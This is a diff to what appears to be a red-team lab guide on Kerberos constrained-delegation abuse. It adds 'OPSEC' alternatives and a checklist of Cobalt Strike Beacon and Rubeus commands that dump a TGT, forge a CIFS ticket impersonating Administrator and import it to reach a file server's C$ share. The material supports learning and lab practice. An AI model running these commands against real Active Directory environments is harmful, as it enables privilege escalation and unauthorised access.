@@ -42,6 +42,7 @@ The example assumes protocol transition is enabled, the impersonated user can be
 ```shell
 beacon> krb_dump /luid:3e7 /service:krbtgt
 # Retain the TGT for LON-WS-1$.
+# OPSEC Alternative
 beacon> krb_s4u /ticket:<FRONTEND_TGT_BASE64> /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
 # Expected final SPN: cifs/lon-fs-1
 ```
@@ -61,6 +62,7 @@ The challenge notes use the same idea with `LON-WKSTN-1$`, an allowed `ldap/lon-
 Use the **final service ticket**, not the front-end TGT or intermediate S4U2self ticket. Create a separate network-only process, record its returned PID, and select that token in Beacon. `FakePass` is a placeholder for the network-only session; the imported ticket supplies Kerberos authentication.
 
 ```shell
+# Rubeus Alternative
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
 # Record ProcessID and verify that ticket import succeeded.
 beacon> steal_token <PID>
@@ -72,13 +74,29 @@ beacon> ls \\lon-fs-1\c$
 
 A ticket proves an identity to a service; it does not grant permissions absent from that identity. Use the hostname matching the ticket, not an IP address.
 
+## Ticket import alternatives
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
+```
+
+```shell
+# OPSEC Alternative
+beacon> make_token CONTOSO\Administrator FakePass
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
+beacon> run klist
+beacon> ls \\lon-fs-1\c$
+```
+
 ## Session cleanup
 
 Purge only the disposable session while its token is selected, then revert and terminate the process created for this test. Do not purge an unrelated user's cache.
 
 ```shell
+# Native cleanup
 beacon> kerberos_ticket_purge
 beacon> rev2self
+# Rubeus createnetonly path only:
 beacon> kill <PID>
 ```
 
@@ -90,6 +108,36 @@ beacon> kill <PID>
 | Modified ticket cannot be decrypted | Services may use different account keys |
 | Ticket accepted but access denied | Impersonated user's authorization on the target |
 | Wrong host in `klist` | Preserve the target hostname; changing only the class does not move the service to another computer |
+
+## Quick checklist
+
+```text
+ENUMERATE AND SUBSTITUTE
+[ ] Read the original SPN from msDS-AllowedToDelegateTo.
+[ ] Verify that original and replacement services use the same account key.
+[ ] Check protocol-transition requirements or obtain a suitable evidence ticket.
+[ ] Extract and verify the controlled front-end TGT.
+[ ] krb_s4u /ticket:<FRONTEND_TGT_BASE64> /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
+[ ] Rubeus alternative: s4u /user:lon-ws-1$ /msdsspn:time/lon-fs-1 /altservice:cifs /ticket:<FRONTEND_TGT_BASE64> /impersonateuser:Administrator /nowrap.
+[ ] Keep the allowed original SPN in the request; substitute the final ticket's service class.
+[ ] Confirm the final client and cifs/lon-fs-1 target before importing.
+
+IMPORT AND VERIFY — CHOOSE ONE PATH
+# OPSEC Alternative
+[ ] PowerShell: [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\administrator.kirbi", [Convert]::FromBase64String("<CIFS_TICKET_BASE64>"))
+[ ] make_token CONTOSO\Administrator FakePass
+[ ] kerberos_ticket_use C:\Users\Attacker\Desktop\administrator.kirbi
+# Rubeus Alternative
+[ ] createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:<CIFS_TICKET_BASE64>
+[ ] Record the returned PID and LUID; steal_token <CREATED_PID>.
+[ ] run klist -> verify the selected session, client identity, target and expiry.
+[ ] ls \\lon-fs-1\c$ -> verify actual service authorization.
+
+CLEANUP
+[ ] Purge only the selected disposable cache: krb_purge or kerberos_ticket_purge.
+[ ] rev2self -> restore the original token.
+[ ] Rubeus createnetonly path only: kill <CREATED_PID>.
+```
 
 ## Related references
 
